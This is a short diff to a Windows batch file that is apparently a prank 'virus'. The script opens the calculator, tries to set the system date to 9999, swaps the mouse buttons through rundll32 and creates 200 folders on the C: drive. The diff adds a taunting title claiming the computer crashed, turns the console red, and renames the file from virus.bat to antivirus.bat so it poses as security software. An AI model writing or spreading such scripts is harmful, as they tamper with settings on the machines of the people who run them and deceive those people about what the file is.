@@ -1,4 +1,5 @@
-echo "lol"
+echo lol
+title HAHAHAHAHAHAHAHHAH YOU COMPUTER CRASHED BECAUSE OF EXAMPLE VIRUS.EXE
 start calc
 date 31.12.9999
 %SystemRoot%/system32/rundll32 user32, SwapMouseButton
@@ -10,4 +11,5 @@ for /l %%i in (1,1,200) do (
     md "C:\Folder%%i"
 )
 
-color red
+color 40
+ren virus.bat antivirus.bat
